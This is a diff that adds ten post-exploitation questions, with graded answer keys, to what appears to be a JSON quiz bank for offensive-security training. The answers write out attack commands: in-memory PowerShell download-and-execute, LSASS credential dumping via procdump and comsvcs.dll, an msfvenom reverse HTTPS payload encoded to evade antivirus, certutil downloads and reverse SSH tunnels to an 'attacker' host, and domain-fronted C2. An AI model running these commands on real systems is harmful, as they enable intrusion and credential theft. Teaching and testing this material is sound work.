@@ -371,5 +371,181 @@
     "hints": [
       "Gather information about who you are, what system you're on, and what's around you"
     ]
+  },
+  {
+    "id": "vq-postex-21",
+    "topic_id": "post_exploitation",
+    "type": "command",
+    "difficulty": "medium",
+    "question": "What PowerShell command downloads and executes a payload in memory without writing to disk?",
+    "correct_answers": [
+      "IEX (New-Object Net.WebClient).DownloadString('http://target/payload.ps1')",
+      "Invoke-Expression (New-Object Net.WebClient).DownloadString('URL')",
+      "IEX (iwr 'http://target/payload.ps1')"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "IEX (Invoke-Expression) combined with WebClient.DownloadString (.NET) executes a PowerShell script entirely in memory, bypassing disk-based AV detection. The script is loaded into a string and piped to IEX, never touching the filesystem. PowerShell 3+ has Invoke-WebRequest (iwr) with aliases.",
+    "hints": [
+      "In-memory execution using .NET WebClient with no disk writes"
+    ]
+  },
+  {
+    "id": "vq-postex-22",
+    "topic_id": "post_exploitation",
+    "type": "scenario",
+    "difficulty": "hard",
+    "question": "Your beacon was detected and killed by EDR. You have a limited shell but can't run Mimikatz. What alternative credential dumping techniques could you use?",
+    "correct_answers": [
+      "Procdump64.exe -ma lsass.exe to dump LSASS, then exfil the dump for offline analysis. Or use comsvcs.dll minidump via rundll32.",
+      "Use procdump to dump LSASS process memory, or rundll32 C:\\windows\\System32\\comsvcs.dll MiniDump PID lsass.dmp full"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "EDR bypasses for credential dumping: procdump -ma lsass.exe (Sysinternals, signed by Microsoft), rundll32 comsvcs.dll MiniDump PID lsass.dmp full (uses built-in DLL), or Task Manager's 'Create dump file'. Exfiltrate the dump and load into Mimikatz offline.",
+    "hints": [
+      "Think about using Microsoft-signed tools or built-in Windows components for dumping"
+    ]
+  },
+  {
+    "id": "vq-postex-23",
+    "topic_id": "post_exploitation",
+    "type": "theory",
+    "difficulty": "medium",
+    "question": "What is DLL side-loading and how does it differ from DLL hijacking?",
+    "correct_answers": [
+      "DLL side-loading exploits a legitimate application's WinSxS/assembly manifest to trick it into loading a malicious DLL from its application directory. Hijacking exploits the search order for a missing DLL.",
+      "Side-loading uses pathed DLL lookup with a signed app; hijacking uses standard search order for missing DLLs"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "DLL side-loading happens when a legitimate (signed) application is configured to load a DLL from its own directory first due to its WinSxS manifest or app-specific configuration. DLL hijacking exploits the standard Windows DLL search order (application dir, system32, PATH) by placing a malicious DLL earlier in the order.",
+    "hints": [
+      "One exploits manifest files, the other exploits search order - both result in malicious DLL execution"
+    ]
+  },
+  {
+    "id": "vq-postex-24",
+    "topic_id": "post_exploitation",
+    "type": "command",
+    "difficulty": "hard",
+    "question": "What tool creates a Meterpreter reverse HTTPS payload with custom encoding to evade AV?",
+    "correct_answers": [
+      "msfvenom -p windows/meterpreter/reverse_https LHOST=attacker LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe",
+      "msfvenom -p windows/x64/meterpreter/reverse_https -e x64/zutto_deki -i 5",
+      "msfvenom with reverse_https meterpreter payload and encoding"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "msfvenom generates payloads with: -p for payload type (meterpreter/reverse_https uses SSL-encrypted C2), -e for encoder (shikata_ga_nai for x86, zutto_deki for x64), -i for encoding iterations (multiple encodes to evade signature-based AV). Reverse HTTPS blends with normal web traffic better than HTTP.",
+    "hints": [
+      "Use msfvenom with reverse_https payload and an encoder with multiple iterations"
+    ]
+  },
+  {
+    "id": "vq-postex-25",
+    "topic_id": "post_exploitation",
+    "type": "scenario",
+    "difficulty": "hard",
+    "question": "You need to transfer a 100MB tool from your attack machine to a Windows target but standard file transfer is blocked by DLP. What techniques could you use?",
+    "correct_answers": [
+      "Split into chunks and use certutil -split with multiple base64-encoded files, or use SMB over port 445, or PowerShell WebClient over HTTPS, or mount an attacker-controlled WebDAV share",
+      "certutil -split with base64 chunks, SMB shares, PowerShell download, WebDAV mounting"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "File transfer techniques: certutil -urlcache -split -f http://attacker/file.exe (signed binary), SMB copy \\\\attacker\\share from UNC path, PowerShell WebClient.DownloadFile over HTTPS, mount with net use \\\\attacker\\share, or use WebDAV with \\\\attacker@SSL\\share.",
+    "hints": [
+      "Think of multiple protocols and signed Microsoft tools for transferring files"
+    ]
+  },
+  {
+    "id": "vq-postex-26",
+    "topic_id": "post_exploitation",
+    "type": "command",
+    "difficulty": "medium",
+    "question": "What Linux command establishes a reverse SSH tunnel to bypass firewall restrictions?",
+    "correct_answers": [
+      "ssh -R 8080:localhost:80 user@attacker",
+      "ssh -R remote_port:localhost:local_port user@attacker.com",
+      "autossh -M 0 -R 8080:localhost:80 user@attacker"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "-R creates a reverse tunnel: traffic sent to attacker:8080 is forwarded to the target's localhost:80. This allows the attacker to access internal services through the compromised host. autossh auto-reconnects if the connection drops. GatewayPorts on the SSH server allows binding to 0.0.0.0 instead of localhost.",
+    "hints": [
+      "The -R flag creates a reverse SSH tunnel from target to attacker"
+    ]
+  },
+  {
+    "id": "vq-postex-27",
+    "topic_id": "post_exploitation",
+    "type": "theory",
+    "difficulty": "hard",
+    "question": "What is a Kerberos Silver Ticket and how does it differ from a Golden Ticket?",
+    "correct_answers": [
+      "Silver Ticket forges a TGS for one specific service using the service account's hash (no DC needed). Golden Ticket forges a TGT using krbtgt hash for domain-wide access (contacts DC).",
+      "Silver = single service TGS (stealthier, no DC). Golden = domain-wide TGT (touches DC)."
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "Silver Ticket: forged TGS for ONE service (e.g., CIFS, HTTP) using the target service account's NTLM hash. Stealthier because it doesn't touch the DC. Golden Ticket: forged TGT using KRBTGT hash, providing access to everything in the domain but requires contacting the DC.",
+    "hints": [
+      "One forges a service-specific ticket, the other forges a master ticket - consider stealth and scope"
+    ]
+  },
+  {
+    "id": "vq-postex-28",
+    "topic_id": "post_exploitation",
+    "type": "command",
+    "difficulty": "hard",
+    "question": "What command in Cobalt Strike spawns a new beacon process running in the context of a different user?",
+    "correct_answers": [
+      "spawnas domain\\user pass",
+      "make_token domain\\user pass",
+      "runas.exe /user:domain\\user calc.exe",
+      "spawnas"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "Cobalt Strike commands: spawnas creates a new beacon as the specified user, make_token creates an access token for credential use, and runas uses the Windows runas utility. In Metasploit, similar functionality via incognito's impersonate_token or steal_token.",
+    "hints": [
+      "Cobalt Strike has spawnas and make_token for running as another user"
+    ]
+  },
+  {
+    "id": "vq-postex-29",
+    "topic_id": "post_exploitation",
+    "type": "scenario",
+    "difficulty": "hard",
+    "question": "You need to establish a C2 channel over a corporate proxy that only allows HTTP/HTTPS and inspects SSL traffic. How do you avoid detection?",
+    "correct_answers": [
+      "Use domain fronting, custom C2 over HTTPS with legitimate-looking traffic patterns, jitter, user-agent rotation, and domain generation algorithms (DGA)",
+      "Domain fronting with CDN, HTTPS C2 with sleep/jitter, mimic normal traffic patterns, rotate user agents"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "Proxy-aware C2 techniques: domain fronting (CDN routing to hide real C2 domain), C2 over HTTPS with realistic mimicking (tls fingerprinting, custom JA3), randomized jitter (sleep + random offset), user-agent rotation, and domain generation algorithms (DGA) for multiple fallback domains.",
+    "hints": [
+      "Think CDN fronting, traffic mimicking, randomization, and fallback domains"
+    ]
+  },
+  {
+    "id": "vq-postex-30",
+    "topic_id": "post_exploitation",
+    "type": "command",
+    "difficulty": "easy",
+    "question": "What command checks the current user's Windows privileges and which ones are enabled?",
+    "correct_answers": [
+      "whoami /priv",
+      "whoami /all (includes GetPrivileges)",
+      "whoami /priv | findstr Enabled"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "whoami /priv lists all Windows privileges assigned to the current user and whether they're enabled. Key privileges: SeImpersonatePrivilege (Potato attacks), SeBackupPrivilege (read any file), SeDebugPrivilege (debug process, Mimikatz), SeTakeOwnershipPrivilege, SeLoadDriverPrivilege.",
+    "hints": [
+      "whoami with the privilege flag shows all security privileges"
+    ]
   }
 ]
